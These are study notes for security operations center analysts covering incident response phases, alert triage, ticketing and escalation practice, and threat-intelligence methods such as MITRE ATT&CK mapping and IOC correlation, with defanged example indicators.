    Relationship between them: Events (constantly generated) → filtered / triggered into Alerts (relevant / suspicious events) → confirmed (after investigation / validation) into Incidents. This matters because it focuses analyst attention on what truly matters, prevents alert fatigue by filtering noise from signal, enables proper classification / escalation / documentation, and ensures IR resources are used efficiently.

  2. 4.2

    Alert Fatigue

    Alert fatigue happens when analysts face a high volume of alerts, many low-priority / repetitive / false-positive, reducing attention, slowing response, and increasing the risk of missing real threats — especially critical for Tier 1 as the first line of defense.

    Described as "mental exhaustion" caused by hundreds of alerts per shift, repeated alerts from the same host / user, alerts that usually turn out benign, and pressure to close tickets quickly for SLAs — leading to desensitization: missing actual threats, assuming "just another false positive," skimming instead of fully investigating, and closing alerts prematurely. It's a common problem across all SOCs.

    Signs:

    • Clicking through alerts without proper review.
    • Ignoring low-priority alerts.
    • Slow response times.
    • Increased errors in analysis / escalation.

    Results:

    • Missing true positives hidden among false positives.
    • Slower response = higher dwell time.
    • Analyst turnover.
    • Damaged team morale.

    Root causes: excessive false positives (poorly tuned detection / alerting rules), overlapping / duplicate alerts (multiple systems monitoring the same events), lack of automation (manual triage for things that could be auto-enriched), improper / ineffective prioritization or severity assignment, inconsistent procedures, and a low signal-to-noise ratio (lots of benign noise, few actionable alerts).

    Reducing alert fatigue: good use of severity / prioritization, effective dashboard use, documenting and escalating repeated false positives, following escalation workflows without over-investigating, batch analysis where possible, and — at the senior / management level — rule / alert tuning, effective automation, and suppressing known-benign activity.

    What to do about it (as an analyst): don't be complacent; follow a structured triage process; document false positives clearly; give every alert at least a quick validation (to confirm it's not serious, or that it is); use available tools (ticketing, notes / KBs); and know when to ask for help — both for analysis and for mental health.

  3. 4.3

    Logging & Analysis Challenges

    The SOC handles massive amounts of data (logs, events, notes, escalations, IOCs across SIEM / EDR / KBs / tickets); logs aren't always perfect, and there are gaps, noise, and complexity — overcoming these challenges is simply part of the job.

    Log information challenges:

    • Log volume — potentially millions of logs / day; raw searches can be extremely difficult at scale; not always a Tier 1 issue directly but worth being aware of.
    • Noise — separating useful information from routine / trivial data.
    • Incomplete / missing logs — from logging issues or systems not properly configured.
    • Different formats — normalization isn't always perfect; different vendors produce different formats, so Tier 1 analysts may need to confidently interpret raw formats directly.
    • Context — logs may not tell the full story (e.g., a firewall log shows a blocked outbound IP but not the process / user that initiated it); this requires checking other systems when SIEM correlation is insufficient — manually consulting EDR info, asset / user data, threat intel.

    False positive / negative matrix:

    Alert generatedNo alert generated
    Malicious activity realTrue Positive (accurate)False Negative (missed)
    Malicious activity not realFalse Positive (inaccurate)True Negative

    Poorly tuned rules → numerous low-value alerts → alert fatigue.

    Timestamps: must be universally standardized (timezone) across all logs; incorrect time can cause missed events (logs appearing out of order, correlation rules missing links between events); helped by time synchronization (NTP servers, Active Directory) — but sync issues remain common and must be actively managed.

    Case Study — "The 3-Hour Blind Spot": a Tier 1 analyst investigating an alert (multiple failed logins → successful login to the HR system from an external IP, followed by large database queries) notices the firewall timestamp (02:12 AM) doesn't match the Windows security log timestamp (05:12 AM) for what should be the same event. Investigation reveals the HR application server's clock was 3 hours ahead due to a timezone misconfiguration. Once corrected, the full timeline aligns perfectly (02:10 failed logins → 02:12 successful login → 02:13–02:20 large SQL queries → 02:25 outbound data spike) — confirming what initially looked like unrelated noise was actually a confirmed breach. Lesson: if log sources aren't time-synchronized, your timeline — and your investigation — is broken.

    Analyst mindset for these challenges: expect imperfection; "no logs" does not mean "no activity"; use multiple sources; escalate to system admins / engineers when problems appear; don't be afraid to ask questions or seek clarification.

Incident Response Fundamentals

  1. 1.1

    What is Incident Response?

    Incident Response (IR) = Investigation → Containment → Eradication → Recovery — ensuring threats are effectively neutralized and systems restored to normal operations while minimizing damage.

    IR components:

    ComponentDescription
    PreparationEstablishing an IR plan, playbooks, and procedures
    Identification & ValidationConfirming the presence of an actual security incident
    ContainmentIsolating affected systems and blocking malicious activity to limit impact
    RecoveryRestoring affected systems / services while validating their security
    Post-Incident ReviewLessons-learned sessions to refine IR procedures
  2. 1.2

    Incident Response Teams

    Types of IR teams: CSIRT (Computer Security Incident Response Team), CERT (Computer Emergency Response Team), PSIRT (Product Security Incident Response Team), Coordination Centers, and MSSPs (Managed Security Service Providers).

    CSIRT — a dedicated, structured team responsible primarily for security incidents, with well-defined processes (detection, response, mitigation, recovery); its main goal is to minimize damage and restore operations as quickly as possible.

    Key CSIRT responsibilities:

    • Incident Management — primary contact, coordination.
    • Detection & Analysis — monitoring / analysis of all data.
    • Response & Mitigation — containment, eradication, mitigation.
    • Threat Intelligence — collection / analysis.
    • Forensic Analysis — evidence collection / analysis.
    • Recovery & Remediation — assisting restoration.
    • Documentation — recording every phase.
    • Reporting — post-mortem reporting, leadership communication.
    • Policies & Procedures — IR plans, playbooks, best practices.

    IRT (Incident Response Team) — a broader term / scope than CSIRT (some orgs use them interchangeably); may handle both security and non-security incidents; frequently staffed across multiple departments (IT, Legal, HR, PR, Security); may not be a formally established standing team.

  3. 1.3

    The Incident Response Process

    4 phases: Preparation → Detection & Analysis → Containment, Eradication & Recovery → Postmortem.

    1. Preparation

      Establishing the IR plan, playbooks, and procedures before an incident happens.

    2. Detection & Analysis

      Many attacks / breaches can go undetected for days, weeks, or months, requiring effective controls / tools to examine network "blind spots" — log collection, correlation, and analysis from hosts, devices, and the network. Analysts use appropriate resources (internal knowledge base, internet resources, intelligence data, other analysts) and knowledge of attack types / vectors / attackers; all org policies / procedures are followed, incidents are documented, and prioritized based on established processes.

    3. Containment, Eradication & Recovery

      Built on the intelligence gathered during analysis — identifying which hosts are involved and choosing a containment strategy. The appropriate strategy is determined by: potential damage to organizational resources, evidence-preservation requirements, affected systems / services, required time / effort / resources, strategy effectiveness (partial vs. full containment), and solution duration (permanent, temporary, or emergency).

    4. Postmortem (Post-Incident Activity)

      Lessons learned; documentation / review of what happened, where, and when; review of responder / staff activities; verification of whether procedures were effective and followed; identifying what could have been done differently (actions that inhibited response / recovery, information sharing that could improve, events that could have been caught sooner, additional tools / resources needed) — while also acknowledging what went well and contributed to a successful recovery.

Events, Alerts & Incidents

  1. 2.1

    Events, Alerts & Incidents Recap

    Events — any observable occurrence in a system / network; raw data, typically high volume. Examples: user logged in / out, file opened / modified / deleted, DNS request, process created / terminated. Most events are normal behavior.

    Alerts — a notification generated by security tools when an event or series of events appears suspicious: events that match rules / signatures, thresholds, or behavior / anomaly definitions / models. Examples: multiple failed logins, malware signature detection. Alerts always require validation.

    Incidents — a security event confirmed or suspected as a threat / attack, requiring response: it threatens CIA (Confidentiality / Integrity / Availability) or policy and requires active response. Examples: confirmed phishing compromise, unauthorized access to data / systems, data exfiltration. Incidents drive IR workflows.

    Event → Incident flow: Events → Detection Logic → Alert → Analyst Validation → Incident.

    Recap:

    TermDescriptionVolumeConfidenceAction
    EventRaw activity recordVery highNeutralUsually none
    AlertSuspicious pattern flagged by toolMediumUncertainReview & validate
    IncidentConfirmed security issueLowHighIncident response
03

Detecting Suspicious Activity

  1. 3.1

    Suspicious Activity Fundamentals

    Suspicious ≠ Confirmed — it's only a signal, a possibility.

    Activity moves along a spectrum: Normal → Unusual → Suspicious → Confirmed incident. Suspicious activity is activity that doesn't fit expectations, or that raises risk.

    Baselines: detecting the suspicious begins with defining the normal — what's typical for this environment. Examples of what to baseline:

    • Login hours
    • Locations / IPs
    • Traffic volume
    • Running processes
    • Installed software
  2. 3.2

    Suspicious Pattern Categories

    5 categories analysts watch:

    • Authentication
    • Network
    • Endpoint & Processes
    • Data Movement
    • Privilege & Accounts

    Remember context — the same activity can be benign or malicious depending on:

    • Privileged users vs. normal users
    • Production server vs. test / lab environment
    • Business hours vs. holidays
    • A "one-off" event vs. one that's repeated or spreading

    Key questions:

    • Is this unusual for this specific situation?
    • Is a high-value account or asset involved?
    • Is the behavior repeated, escalating, or spreading?
    • Do multiple data sources agree?
  3. 3.3

    Phishing & Email Compromise

    Phishing is the most common initial access path. Attacker objectives: credential theft / account takeover, malware delivery, or direct access via OAuth / app-access abuse.

    Flow: Email lure → User Action → Attacker Objective.

    Email indicators (pre-click):

    • Domain or sender anomalies
    • Mismatched reply-to address
    • Coercive language
    • Sense of urgency
    • Suspicious attachments
    • Suspicious links

    Post-click indicators:

    • Authorization anomalies — new geographic location / device for the user, login from an "impossible travel" location, MFA fatigue patterns (repeated push prompts).
    • Mailbox changes — new forwarding rules, inbox rules hiding / moving messages, unusual permissions granted.
    • Unusual outbound activity — a spike in sent messages, internal phishing messages originating from the compromised user.
  4. 3.4

    Credential & Account Attacks

    Account compromise = attempts to gain access to accounts, typically using stolen or guessed credentials, aiming for account takeover — pivoting to other systems (lateral movement) or elevating to root / admin (privilege escalation). Many incidents start here with no malware at all.

    Common attack types: brute force attacks, password spraying, credential stuffing, MFA fatigue & abuse.

    Failure indicators:

    • Multiple authentication failures in general.
    • Brute force = repeated failures for a single account.
    • Password spraying = failures across many accounts.
    • Credential stuffing = many accounts with fewer failures each, typically followed by a success.
    • MFA abuse = multiple push notifications, the user denying prompts.

    Success indicators:

    • Multiple auth failures followed by a success.
    • Login from a new device.
    • Impossible travel.
    • Repeated MFA prompts within minutes followed by one approval.
    • Changes to MFA configuration.

    These can lead to privilege escalation, lateral movement, or configuration changes.

  5. 3.5

    Malware & Endpoint Compromise

    Endpoint compromise = attacker activity present on / via an endpoint in the network.

    Detected via: EDR / AV alerts, suspicious processes / scripts, network "callback" traffic, and user-reported symptoms.

    Indicator categories:

    • Process Execution
    • Files and Artifacts
    • Persistence
    • Network Indicators
  6. 3.6

    Network Intrusions

    Suspicious network behavior indicating attacker activity — typically seen as patterns, not single events, and indicators frequently connect multiple systems together.

    Four stages: Reconnaissance & Scanning → C2 & Beaconing → Lateral Movement → Data Exfiltration.

    1. Reconnaissance & Scanning

      Port scans, host sweeps, internal recon, IDS / firewall indicators — remember to account for approved vulnerability scanners (avoid false positives).

    2. Command & Control Beaconing

      Periodic callbacks (repeated outbound connections at regular intervals); rare domains / IPs (never seen before in the org, rare TLDs, newly-registered domains); odd ports / protocols (HTTP(S) to unusual paths / user-agents, DNS tunnels, TLS to IPs or using self-signed certs).

    3. Lateral Movement

      Account hopping (one user authenticating to multiple hosts); remote execution / administration (suspicious use of embedded protocols or third-party tools); access to admin shares (C$, ADMIN$, IPC$); Windows authentication anomalies (Kerberos / NTLM).

    4. Data Exfiltration

      Increased data-transfer volume vs. baseline; suspicious timing (a spike after other activity, or outside business hours); unusual destinations (abnormal storage services, personal cloud, rare domains); behavioral combinations — and still only suspicious until confirmed.

  1. 4.1

    Validation

    A confidence check: is the alert meaningful, and what action is required next?

    This is a decision point — close or escalate — not a deep investigation.

  2. 4.2

    Why context matters — sources of context:

    Triaging Alerts

    Triage happens right after context / validation.

    Validation asks "Is this likely real?"; Triage asks "How urgent is it, and where does it go?" — rapid prioritization and routing, not a full investigation, containment, or playbook execution.

    Priority determination factors:

Playbooks, Documentation & the Tier 1 Workflow

  1. 5.1

    Incident Response Playbooks

    Playbooks = documented, repeatable response steps, typically built for specific incident types (ransomware, data exfil, multiple account compromise, phishing, insider activity) — designed for consistency and speed.

    A SOC L1 analyst is only expected to use playbooks, not write them.

    Playbooks in the workflow: Alert → Context & Validation → Triage → Playbooks → Escalation & Response → Resolution & Closure.

    Tier 1 actions with a playbook: follow the assigned steps, gather the specified evidence, perform only approved actions, escalate at specific decision points, and document outcomes.

    Example playbook — Potential Phishing Incident:

    1. Confirm email details

      Sender, recipients, subject, links, attachments.

    2. Check for user interaction

      If the user entered credentials, escalate.

    3. Look for related auth anomalies

      If found, escalate.

    4. Escalate if specific compromise indicators are present

      Follow the escalation path.

    5. Document and escalate or close

      Record outcome in the case.

    Example playbook — Malware Detection:

    1. Review EDR alert & processes

      Understand what fired and why.

    2. Identify host / user & scope

      Confirm the affected asset(s).

    3. Check for network callbacks

      If C2 traffic found, escalate.

    4. Document and escalate or close

      Record outcome in the case.

  2. 5.2

    Documenting & Reporting

    IR documentation is used in more places than a simple ticket, and must be more detailed / higher-quality: reproducible, and built on neutral findings — facts first, observation kept separate from interpretation, avoiding assumptions. It should build a timeline, preserve evidence, record decisions and their rationale, and enable hand-offs and lessons-learned.

    Tier 1 responsibility in documentation: who / what / when / where, key indicators, scope information, actions taken — and every note must carry a timestamp for detection time, observed-activity time, and action time.

    Evidence handling:

    • Don't alter evidence.
    • Note the source and collection method.
    • Keep raw data and artifacts.
    • Follow the org's SOP.

    Additional notes to include: why the incident was escalated or closed, the confidence level, and any recommendations.

    Tier 1 Incident Workflow (with worked "Possible Phishing" example)

    The full workflow: Alert → Context & Validation → Triage → Playbooks → Escalation & Response → Resolution & Closure.

Ticketing in the SOC

  1. 1.1

    Ticketing in the SOC

    What is a SOC Ticket? A record of a security event / activity — either triggered automatically from a security alert or created manually. It tracks the full investigation: the initial trigger, findings from evidence, actions taken, and any escalation. Tickets are frequently tied into other tools (SIEMs, EDR, IR platforms).

    Why ticket importance matters: tickets document investigation / response actions, support communication between analysts (and across shifts / teams), serve as an audit trail (tracking actions, maintaining accountability, legal / compliance), and act as the source of truth during and after incidents. "If it's not in the ticket, it didn't happen."

    Why ticketing matters — function → impact:

    FunctionImpact
    Alert trackingNo alert ignored or forgotten
    Workflow managementDefines who owns what and when
    Context preservationSeamless handoff between shifts
    IR readinessSupports root cause and post-incident review
    Metrics & reportingSOC KPIs and process improvements

    Tickets and the SOC workflow:

    1. Alert Triggered

      SIEM / EDR detects and triggers an alert.

    2. Ticket Created

      Analyst creates or acknowledges an auto-created ticket.

    3. Triage

      Analyst identifies threat indicators, determines true / false positive, with documentation happening throughout.

    4. Continuous Updates

      Further investigation, escalation decisions, additional notifications.

    5. Outcome

      Escalated, suppressed, or closed.

    Tickets are the bridge between systems: they translate a SIEM alert into human response and automation into human judgment; they carry the workflow from Tier 1 → Tier 2 → DFIR, and from detection → investigation → remediation. They enable and support incident timelines, evidence collection, root-cause analysis / lessons-learned, and legal / regulatory process.

    Tickets ≠ admin tasks: they aren't "just paperwork," "a formality," or "optional" — they are evidence, communication, and operational history. Tickets are part of the analyst's job, not separate from it.

Anatomy of a SOC Ticket & Common Solutions

  1. 2.1

    Core Ticket Fields

    Core ticket fields:

    • Summary / title / ticket number.
    • AlertID (or source).
    • Description.
    • Affected entities.
    • Actions taken.
    • Status (open / closed / escalated / etc.).
    • Tags / classification / categories.
    • Sensitivity.
  2. 2.2

    Common Ticketing Solutions

    Recommended platform features: integration with other tools (SIEM / EDR / SOAR), structured fields plus freeform notes (with timestamps on all entries), escalation workflows, tagging / categorization / prioritization, and sensitivity classification (to assist with policy enforcement).

    • Jira Service Management — part of the Atlassian suite; commonly used in IT / hybrid SOC environments; integrates with Confluence, Slack, and others; useful for tracking Tier 1 alert investigations, phishing cases, and escalation assignments.
    • ServiceNow — part of the Security Operations suite; used mostly in mature SOCs (large enterprise, banking, large corporate environments); in-depth integrations across multiple platforms and a large amount of AI integration — can be overwhelming to start with.

03

SOC Ticket Lifecycle & Quality

  1. 3.1

    Ticket Lifecycle

    1. Alert or Trigger

      Either an automated alert (typically from SIEM / EDR) or a user report to the SOC.

    2. Ticket Created and Assigned

      Automated (through SIEM / SOAR integration) or manual (by an analyst from a user report, with required information included); the ticket is claimed by an analyst or assigned to another.

    3. Triage & Investigation

      Review alert details; add & enrich IOCs; check all appropriate logs, EDR info, network history, user activity, etc.; evaluate the validity of the ticket.

    4. Status Updates

      Continuous documentation updates; ticket states include Open, In Progress, Awaiting Info, Closed.

    5. Escalate or Close

      Escalate to Tier 2 or IR, or suppress if benign actions; closed when the investigation is complete.

    Ticket challenges:

    • Improper status updates — leaving a ticket in the wrong status can mislead other analysts, make an issue appear unresolved, and skew metrics / performance.
    • Insufficient documentation — the next analyst has no / insufficient context.
    • Skipped escalation steps — may delay IR / containment.
    • Closing too quickly — misidentifying a true positive as a false positive, losing critical analysis context.
  2. 3.2

    Writing Quality Tickets

    Quality matters because tickets are the record of events / analyst actions, a communication tool across shifts / analysts, and the source of truth for audits and IR. Low-quality tickets can delay incident response / containment, cause unnecessary or delayed escalations, and lose investigation context.

    Always assume the next reader has no prior context — always include what's been done so far, what still needs to be done, and why it matters.

    Attributes of a good ticket:

    • Clear — easy to read / understand at a glance.
    • Complete — no missing steps / details / indicators.
    • Concise — no fluff, but all essential context included.
    • Structured — follows a predictable format / template.
    • Professional — neutral, factual tone.

    Use strong phrasing — examples:

    • ✘ "I checked and it looks ok" → ✔ "Reviewed login activity for jsmith for 8/7/25. All logins from US IPs, no anomalies found."
    • ✘ "Potential phishing" → ✔ "Email contained obfuscated link to suspicious domain (hxxp://secure-portal.biz). Matches known phishing pattern."
    • ✘ "User clicked suspicious link" → ✔ "Logs show user clicked link in email at 10:42am; redirected to (hxxp://login-verify.com). Flagged as phishing by 26 vendors on VT."

    Structure and BLUF ("Bottom Line Up Front"): structured notes should cover alert summary, investigation steps, IOC enrichment, findings / analysis details, actions taken, and recommendations / next steps. BLUF means starting with the key finding or conclusion, then explaining how you reached it — this helps Tier 2 / IR quickly understand the ticket.

    Common mistakes to avoid:

    • Sloppy formatting / misspelling — reduces readability, clarity, credibility.
    • Vague statements — leaves too much open to interpretation.
    • Missing timestamps — the timeline is critical for audits / IR.
    • Missing context for escalation — Tier 2 will lack the full picture and may not respond quickly.
  3. 3.3

    SOC Ticket Metadata

    Metadata = data about the ticket (not investigation / incident-specific) that helps organize / categorize / classify tickets: severity, priority, general tags, timestamps.

    Metadata's use in the SOC:

    • Searchability — quickly find / sort tickets by metadata.
    • Correlation — link incidents by shared attributes.
    • Automation — trigger workflows based on metadata.
    • Reporting — identify trends / recurring threats.
    • Compliance — assist with audits / regulations.

    Common ticket metadata:

    FieldPurposeExample values
    SeverityIndicates potential impactLow / Medium / High / Critical
    PriorityOperational urgency for analyst actionP3 (Normal), P1 (Urgent)
    CategoryType of eventPhishing, Malware, Brute Force
    SourceWhere the alert came fromSIEM, EDR, Firewall
    Tags / LabelsQuick identifiers for filtering#phishing, #policy, #encryption
    StatusCurrent stage in lifecycleOpen, In Progress, Escalated, Closed

    Best practices: accuracy (never guess on fields), consistency (follow the org's standard practices), update as needed (as new investigation info emerges), and avoid leaving fields blank (missing data makes the process harder).

04

Escalation & Collaboration

  1. 4.1

    SOC Ticket Escalation

    Escalation = sending an alert to Tier 2 or IR to ensure a timely response to more serious threats, bring in analysts with deeper knowledge, and keep the overall SOC workflow efficient (Tier 1 doesn't get stuck on advanced / complex tickets and can keep triaging incoming alerts). Escalation is not "passing the buck" — it's ensuring the right person handles the problem.

    Common escalation criteria:

    • Confirmed malicious activity beyond Tier 1's authority to remediate.
    • Potential / confirmed data-breach indicators.
    • Critical assets affected (hardware or people).
    • Isolation / quarantine needed.
    • Malware removal required.
    • Multiple related alerts (may indicate an ongoing / coordinated attack).
    • Incidents requiring deep log analysis or forensics.

    Related alerts are a common escalation trigger — patterns across multiple alerts (same source IP across multiple hosts, multiple failed logins across multiple accounts, numerous alerts for an identical phishing message) can indicate a progressive attack. Linking / referencing tickets together speeds up Tier 2's response and ensures IR can see the entire attack chain.

    Information to include when escalating:

    • A clear summary (BLUF, so Tier 2 can quickly determine what's happening and next steps).
    • Key indicators of compromise.
    • Steps taken so far (avoids repeated work / investigation).
    • Relevant evidence acquired (logs, screenshots, tool outputs).
    • The reason for escalation (e.g., part of a larger attack, or requires admin access).

    Escalation workflow:

    1. Determine Escalation Need

      Confirm criteria are met.

    2. Gather Required Evidence

      Logs, screenshots, tool output.

    3. Verify Ticket Information

      Fields are accurate and complete.

    4. Document Escalation Reason

      Why this needs Tier 2 / IR.

    5. Notify Tier 2

      Follow the org's channel.

    6. Update Ticket Status

      Reflect the handoff in the case.

    Decision-to-escalate flow: ticket assigned to Tier 1 analyst → validate and triage → valid alert? If No → close the ticket (false positive or benign true positive). If Yes → continue investigation → can Tier 1 resolve it? If Yes → resolve and close. If No → look for linked alerts / events → additional alerts found? If Yes → include link info in escalation notes. Either way → escalate to Tier 2 / IR.

    Common mistakes & best practices:

    • ✘ Escalating too early → ✔ Escalate after confirming validity and need.
    • ✘ Escalating too late → ✔ Escalate in a timely manner once the need for additional resources / actions is identified.
    • ✘ Poor documentation → ✔ Include all relevant context, IOCs, linked cases, and steps already taken; follow defined escalation protocols.
    • ✘ Missing linked alert context → ✔ Watch for similar alerts / events, or ones sharing IOCs, IPs, accounts, etc.
  2. 4.2

    Collaborative Documentation

    Many tickets involve more than one analyst, or transition across shifts — multiple analysts can work the same ticket, which requires clear communication and notes (prevents repeated work, missed details).

    Benefits: clear audit trails, easier / more efficient escalation, improved training for new staff, reduced resolution times.

    Collaboration principles:

    • Single source of truth — all updates go in the ticket.
    • Chronological notes — log events / notes in the order they occur.
    • Attribution — identify who made each entry and when.
    • Action-oriented updates — clearly state what was done and why.
    • No private knowledge — avoid keeping your own personal notes outside the ticket.

    Collaboration tips & best practices:

    • Shift handoffs — a high-risk point for losing information / context — summarize notes and highlight pending actions / current escalations.
    • Avoid "collisions" — don't overwrite others' notes — always add, not replace; timestamp entries if not automatic; if conflicting info appears, clarify in notes and notify / tag the other analyst for resolution.
    • Use templates when possible.
    • Update the ticket in real time.

  1. 5.1

    Incident Reports

    Incident reports ≠ tickets. An incident report is a permanent record of what happened, the actions taken, and the outcomes — supporting management review, technical remediation, compliance / legal, and future incident prevention. A ticket is the working document during investigation / response; an incident report is the finalized document after closure.

    Metrics and quality: incident reports aren't just documentation — they drive incident-response decisions, inform leadership and compliance reporting, and train / guide other analysts.

    A quality report has:

    • Completeness
    • Clarity
    • Accuracy
    • Actionability
    • Timeliness

The Role of Threat Intelligence in Cybersecurity

  1. 1.1

    What is Threat Intelligence?

    Threat intelligence is built from:

    • Indicators of Compromise (IoCs).
    • Tactics, Techniques, and Procedures (TTPs).
    • Attribution Information.
    • Contextual Data.

    CTI across the Cyber Defense Lifecycle (Planning → Prevention → Detection → Response → Recovery, a continuous cycle):

    • Planning — vulnerability prioritization, policy hardening, threat modeling, blocklisting.
    • Prevention — feeds into the same cycle, informed by planning.
    • Detection — IOC matching, TTP detection, alert enrichment, threat hunting guides.
    • Response — adversary playbooks, contextual response, attribution support.
    • Recovery — post-incident review, lessons learned, improvement planning.

    The cycle is also fed by planning-level activities: risk assessments, security roadmaps, simulations / tabletop exercises, regulatory compliance.

    Benefits of CTI: reduces breach costs, speeds up detection and response, improves SOC efficiency, enables proactive defense, and has direct real-world relevance.

  2. 1.2

    Where CTI Fits & Why It's Needed

    Where threat intelligence integrates into existing infrastructure: SIEM, Endpoint Detection and Response, Firewall / WAF, SOAR, and dedicated Threat Intelligence Platforms.

    Sources: OSINT, government feeds (e.g., CISA KEV, NVD), ISACs, commercial feeds, dark web monitoring.

    What good CTI delivers: faster incident response, reduced risk exposure, better investment decisions, more effective threat hunting.

    Common CTI failure modes: information overload, poor relevance to the organization, lack of trained analysts, and failure to operationalize the intelligence collected.

    CTI as a force multiplier: it adds value across the entire Cyber Defense Lifecycle — the mantra is "Don't just collect — operationalize" and "Quality over quantity." It requires people, process, and technology together, not any one alone.

03

Core CTI Processes

  1. 3.1

    The CTI Lifecycle

    An iterative cycle where each phase builds on the last, with actionable intelligence as the goal: Planning & Direction → Collection → Processing & Exploitation → Analysis & Production → Dissemination → Feedback (which loops back to Planning & Direction).

    Applied specifically to threat hunting, each stage looks like:

    1. Planning & Direction — Define the Hunt

      What threats matter to us now? Who are we hunting and why? What are our Priority Intelligence Requirements (PIRs)? Which MITRE TTPs should we focus on? Example: "We've seen TA577 abusing DLL search order hijacking in our sector. Let's hunt for T1574.001 across legacy systems."

    2. Collection — Gather the Right Telemetry

      Pull EDR, NetFlow, Windows Logs, Authentication Logs; integrate CTI (IOCs, TTPs, actor profiles); align with hunt scope and assets. Example: "Collected DNS logs after CTI warned of APT28 using cdn-assets-update[.]com."

    3. Processing & Exploitation — Normalize and Enrich Data

      Normalize logs into a common format; de-dupe and filter irrelevant data; enrich with context (GeoIP, WHOIS, MITRE tags). Example: "Used a script to tag base64 PowerShell commands with T1059.001 and flag unsigned scripts."

    4. Analysis & Production — Test the Hypothesis

      Look for anomalous behavior; correlate events across systems; validate adversary TTPs in the environment; document findings with context and severity. Example: "Lateral movement via PSExec discovered after matching IR evidence to Lazarus TTPs."

    5. Dissemination — Get the Intel to the Right Hands

      Alert the SOC for detection engineering; share with IR and leadership; document in knowledgebases or playbooks. Example: "IOC list delivered to firewall team; Sigma rule deployed in SIEM to catch reuse."

    6. Feedback — Improve the Next Hunt

      Review what worked / didn't; collect feedback from IR / SOC / CTI teams; update PIRs, scope, and detection logic. Example: "SOC reported false positives on the PowerShell rule; we refined it using baseline logic."

  2. 3.2

    Prioritizing Intelligence

    Why prioritization matters: you can't act on everything (the flood of intel); wasted effort vs. focused response (the cost of distraction); the goal is Relevance + Urgency + Impact.

    The three-way balance — Relevance, Actionability, Criticality:

    • Relevance — Is it aligned with your industry, assets, geography, threat model?
    • Actionability — Can it be used to inform detection / prevention? Actionable indicators include IPs / domains with rich context (first seen, campaign link, threat actor), TTPs tied to detections in your EDR / SIEM, and Snort / YARA / Sigma-format rules.
    • Criticality — What is the risk if left unmitigated? Factors: potential impact (financial, operational, reputational), data at risk, threat actor sophistication. Risk = Likelihood × Impact.

    Example relevance scoring:

    SectorPlatformGeographyRelevance
    FinancialCitrixAsia-onlyMedium
    HealthcareMicrosoft 365US-basedLow

    Scoring frameworks:

    • Admiralty Code (NATO rating system) — rates Source Reliability (A–F) and Information Credibility (1–6) for incoming intel.
    • Diamond Model — evaluates Adversary, Infrastructure, Victim, and Capability, scored by proximity to your assets / operations.
    • Risk-Based Scoring — formula: Likelihood × Impact × Exposure, ties intelligence directly to risk posture.

    Prioritization matrix (Relevance × Actionability):

    Low ActionabilityHigh Actionability
    Low RelevanceIgnoreWatch
    High RelevanceInvestigatePRIORITIZE

    Automation vs. the analyst: SIEMs and TIPs can automate prioritization (STIX tags, scoring feeds, expiration dates), but analysts are still needed for campaign tie-ins, understanding nuanced TTPs, and applying internal organizational knowledge.

    Key takeaways: not all intelligence is equal; prioritize based on Relevance, Actionability, and Criticality; use scoring frameworks to stay consistent; human analysis adds needed nuance.

  4. 3.4

    Adversary Analysis & MITRE ATT&CK

    Adversary analysis = tracking, profiling, and understanding threat actors. MITRE ATT&CK is a knowledgebase of tactics and techniques observed in the real world, mapping the observed behaviors of known threat actors or campaigns across a tactic chain (Initial Access → Privilege Escalation → Defense Evasion → Lateral Movement → Collection → Exfiltration).

    ATT&CK stands for Adversarial Tactics, Techniques, and Common Knowledge, and is structured as:

    • Tactics — the adversary's goals.
    • Techniques / Sub-techniques — how the goals are achieved.
    • Mitigations and relationships — how to respond.
    • Data sources and detections — which logs / signals can detect the behaviors.

    How analysts use ATT&CK: map threat-group behavior, compare behaviors across incidents, hunt for activity using TTPs, and prioritize detection engineering. Threat Actor pages list known techniques, tools, software, and references.

    Working from indicators: e.g., use of PowerShell (T1059.001) or use of Web Protocols (T1071.001) — asking "does this activity match other known threat actor activity?" to guide incident response and assess adversary objectives.

    ATT&CK is not a silver bullet — it maps behaviors, not just indicators.

    Core use cases: Threat Hunting, Detection Engineering, Threat Emulation / Red Teaming, and Attribution Support.

  5. 3.5

    Correlating Indicators of Compromise

    Correlation links IoCs across time, tools, and sources — transforming isolated data points into an intelligence picture, and enabling detection, attribution, and response.

    IoCs are digital clues tied to malicious activity — can be atomic (an IP, a hash value) or behavioral (a process tree) — used to detect, track, and stop threats.

    Sources for correlation: internal telemetry (SIEM, EDR, DNS, proxy), external intel (MISP, OSINT, vendor feeds), government / ISACs (CISA, sector-specific ISACs), historical incidents and ticketing systems.

    Why correlate: validate threats using multiple sources; enhance context and actor attribution; detect low-signal or stealthy threats; link infrastructure and uncover campaigns.

    5 correlation techniques:

    1. Exact Matching

      Direct one-to-one matching of identical IOC values (IPs, hashes, domains) across datasets; the most basic form, often automated in SIEMs / TIPs / feeds. Example: IP 192.0.2.45 seen in both the org's SIEM and a subscribed threat intel feed.

    2. Infrastructure Pivoting

      Using one IoC to discover related indicators via shared infrastructure (pivot from a domain to its IP, then find all domains on that IP; uses WHOIS, passive DNS, SSL cert reuse, ASN data) to expand visibility into the adversary's digital footprint. Example: domain evil-login[.]net hosted on 45.66.123.9, which also hosts 5 other known malicious domains.

    3. Fuzzy Matching

      Identifying indicators that are similar but not exact (typosquatting / lookalike domains, fuzzy hashing like ssdeep for near-identical malware, minor code / filename variations). Example: dropbox[.]com vs. dropb0x-secure[.]com; malware hashes with 93% similarity.

    4. Time-Based Analysis

      Correlating IoCs by event timing to reconstruct incidents, linking events across logs by timestamp to reveal attack progression and lateral movement, supporting timeline-based hunting / IR. Worked example: a single incident reconstructed from a phishing email hash at 10:03 AM, a matching DNS lookup at 10:05, an obfuscated PowerShell process at 10:06, and an outbound C2 connection at 10:07, all correlated together.

    5. TTP and Campaign Linking

      Matching IoCs to known tactics, techniques, and threat-actor patterns: aligning IoCs with MITRE ATT&CK techniques, identifying repeat tool sets / scripting behaviors, mapping to historical campaigns / APT profiles. Examples: a PowerShell command mapping to T1059.001; infrastructure overlap confirming behavioral linkage to an APT28 campaign.

    Tools: TIPs (threat sharing and event correlation), MITRE ATT&CK Navigator, Maltego (infrastructure graphing), Elastic / Splunk (internal log correlation), Python scripts plus enrichment APIs.

    Best practices: normalize and enrich data before correlating; use STIX / TAXII for standardization; always verify external IoCs against internal logs; tag by time, actor, and confidence; avoid correlation overload (don't link everything).

    Key takeaways: IoCs are valuable alone, but powerful when linked; correlation reveals intent, infrastructure, and actor behavior; use tools and context to go beyond surface indicators; good correlation is the difference between alerts and insight.

04

Integrating CTI into Detection & Defense

  1. 4.1

    CTI-Driven Detection Engineering

    Benefits: faster detection of known-bad, improved context for analysis, better alert triage with fewer false positives, and automation possibilities.

